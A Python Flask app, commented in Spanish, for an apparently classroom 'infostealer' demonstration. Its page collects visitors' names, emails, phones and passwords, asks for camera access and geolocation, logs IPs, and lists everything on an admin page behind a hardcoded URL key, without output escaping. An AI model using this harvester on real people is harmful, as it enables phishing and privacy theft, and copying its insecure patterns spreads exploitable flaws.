from flask import Flask, request, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)

DATA_FILE = "datos_recolectados.json"
ADMIN_KEY = "miclase2026"

# Página principal con formulario y solicitud de permisos
LANDING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Demo Infostealer - Acceso al sistema</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e1a;
            color: #00ffcc;
            text-align: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: rgba(0,0,0,0.7);
            padding: 20px;
            border-radius: 10px;
        }
        h1 { font-size: 2em; }
        input, button {
            width: 90%;
            padding: 12px;
            margin: 8px 0;
            border-radius: 5px;
            border: none;
            font-size: 1em;
        }
        input {
            background: #1e2a3a;
            color: white;
        }
        button {
            background: #00ffcc;
            color: #0a0e1a;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background: #0a0e1a;
            color: #00ffcc;
            border: 1px solid #00ffcc;
        }
        .status {
            margin-top: 20px;
            font-size: 0.9em;
            color: #ffaa00;
        }
        .small {
            font-size: 0.8em;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 VERIFICACIÓN DE ACCESO</h1>
        <p>Para continuar con la presentación interactiva, complete sus datos y conceda los permisos solicitados.</p>

        <form id="dataForm">
            <input type="text" id="nombre" placeholder="Nombre completo" required>
            <input type="email" id="correo" placeholder="Correo electrónico" required>
            <input type="tel" id="telefono" placeholder="Número de teléfono" required>
            <input type="password" id="contrasena" placeholder="Contraseña (solo para simulación)">
            <button type="submit">Enviar datos</button>
        </form>

        <button id="btnCamara">🎥 Habilitar cámara y micrófono</button>
        <button id="btnGeo">📍 Compartir ubicación</button>

        <div id="estado" class="status"></div>
        <p class="small">Esta es una simulación educativa controlada. Los datos se borrarán al final de la clase.</p>
    </div>

    <script>
        const estadoDiv = document.getElementById('estado');

        async function enviarDatos() {
            const nombre = document.getElementById('nombre').value;
            const correo = document.getElementById('correo').value;
            const telefono = document.getElementById('telefono').value;
            const contrasena = document.getElementById('contrasena').value;

            if (!nombre || !correo || !telefono) {
                estadoDiv.innerHTML = '❌ Por favor complete nombre, correo y teléfono.';
                return;
            }

            const response = await fetch('/enviar_datos', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ nombre, correo, telefono, contrasena })
            });
            if (response.ok) {
                estadoDiv.innerHTML = '✅ Datos enviados. Gracias por participar.';
            } else {
                estadoDiv.innerHTML = '❌ Error al enviar datos.';
            }
        }

        document.getElementById('dataForm').addEventListener('submit', (e) => {
            e.preventDefault();
            enviarDatos();
        });

        document.getElementById('btnCamara').addEventListener('click', async () => {
            estadoDiv.innerHTML = 'Solicitando permisos de cámara y micrófono...';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                estadoDiv.innerHTML = '✅ Permisos concedidos. Puede continuar.';
                // Detener el stream después de 2 segundos
                setTimeout(() => {
                    stream.getTracks().forEach(track => track.stop());
                }, 2000);
                await fetch('/registrar_permiso', { method: 'POST' });
            } catch (err) {
                estadoDiv.innerHTML = '❌ Permiso denegado o error: ' + err.message;
                await fetch('/registrar_permiso_denegado', { method: 'POST' });
            }
        });

        document.getElementById('btnGeo').addEventListener('click', () => {
            if (!navigator.geolocation) {
                estadoDiv.innerHTML = '❌ Geolocalización no soportada.';
                return;
            }
            estadoDiv.innerHTML = 'Obteniendo ubicación...';
            navigator.geolocation.getCurrentPosition(async (position) => {
                const { latitude, longitude } = position.coords;
                estadoDiv.innerHTML = `📍 Ubicación: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;
                await fetch('/registrar_geo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ lat: latitude, lon: longitude })
                });
            }, (err) => {
                estadoDiv.innerHTML = '❌ No se pudo obtener ubicación: ' + err.message;
            });
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Cargar datos existentes
    datos = []
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            datos = json.load(f)

    # Crear nuevo registro con datos básicos
    nuevo_registro = {
        "hora": hora,
        "ip": ip,
        "navegador": user_agent[:200],
        "nombre": "",
        "correo": "",
        "telefono": "",
        "contrasena": "",
        "permiso_camara": "Pendiente",
        "geolocalizacion": ""
    }
    datos.append(nuevo_registro)

    with open(DATA_FILE, "w") as f:
        json.dump(datos, f, indent=4)

    print(f"[!] Nueva visita: {ip} - {hora}")
    return LANDING_PAGE

@app.route('/enviar_datos', methods=['POST'])
def enviar_datos():
    data = request.get_json()
    ip = request.remote_addr
    hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            datos = json.load(f)
        # Actualizar el último registro con la misma IP (o el más reciente)
        for registro in reversed(datos):
            if registro["ip"] == ip:
                registro["nombre"] = data.get("nombre", "")
                registro["correo"] = data.get("correo", "")
                registro["telefono"] = data.get("telefono", "")
                registro["contrasena"] = data.get("contrasena", "")
                break
        with open(DATA_FILE, "w") as f:
            json.dump(datos, f, indent=4)
    return jsonify({"status": "ok"})

@app.route('/registrar_permiso', methods=['POST'])
def registrar_permiso():
    ip = request.remote_addr
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            datos = json.load(f)
        for registro in reversed(datos):
            if registro["ip"] == ip:
                registro["permiso_camara"] = "Concedido"
                break
        with open(DATA_FILE, "w") as f:
            json.dump(datos, f, indent=4)
    return "OK", 200

@app.route('/registrar_permiso_denegado', methods=['POST'])
def registrar_permiso_denegado():
    ip = request.remote_addr
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            datos = json.load(f)
        for registro in reversed(datos):
            if registro["ip"] == ip:
                registro["permiso_camara"] = "Denegado"
                break
        with open(DATA_FILE, "w") as f:
            json.dump(datos, f, indent=4)
    return "OK", 200

@app.route('/registrar_geo', methods=['POST'])
def registrar_geo():
    data = request.get_json()
    ip = request.remote_addr
    geo_str = f"{data.get('lat', '')}, {data.get('lon', '')}"
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            datos = json.load(f)
        for registro in reversed(datos):
            if registro["ip"] == ip:
                registro["geolocalizacion"] = geo_str
                break
        with open(DATA_FILE, "w") as f:
            json.dump(datos, f, indent=4)
    return "OK", 200

@app.route('/admin/<clave>')
def admin(clave):
    if clave != ADMIN_KEY:
        return "Acceso denegado", 403
    if not os.path.exists(DATA_FILE):
        return "<h3>No hay datos aún. Espera a que escaneen el QR.</h3>"
    with open(DATA_FILE, "r") as f:
        datos = json.load(f)

    html = """
    <h2>📦 Datos capturados (simulación infostealer)</h2>
    <table border='1' cellpadding='5' style='border-collapse: collapse; font-size: 12px;'>
    <tr>
        <th>Hora</th><th>IP</th><th>Navegador</th>
        <th>Nombre</th><th>Correo</th><th>Teléfono</th><th>Contraseña</th>
        <th>Permiso Cámara/Mic</th><th>Geolocalización</th>
    </tr>
    """
    for d in datos:
        html += f"""
        <tr>
            <td>{d['hora']}</td>
            <td>{d['ip']}</td>
            <td>{d['navegador'][:80]}</td>
            <td>{d.get('nombre', '')}</td>
            <td>{d.get('correo', '')}</td>
            <td>{d.get('telefono', '')}</td>
            <td>{d.get('contrasena', '')}</td>
            <td>{d.get('permiso_camara', '')}</td>
            <td>{d.get('geolocalizacion', '')}</td>
        </tr>
        """
    html += "</table><br>"
    html += "<p><a href='/borrar_datos' onclick='return confirm(\"¿Borrar todos los datos?\")'>🗑️ Borrar todos los datos (transparencia)</a></p>"
    return html

@app.route('/borrar_datos')
def borrar_datos():
    if os.path.exists(DATA_FILE):
        os.remove(DATA_FILE)
    return "<h3>✅ Todos los datos han sido eliminados. La simulación terminó.</h3><p><a href='/'>Volver</a></p>"

if __name__ == '__main__':
    if os.path.exists(DATA_FILE):
        os.remove(DATA_FILE)
    app.run(host='0.0.0.0', port=5000)
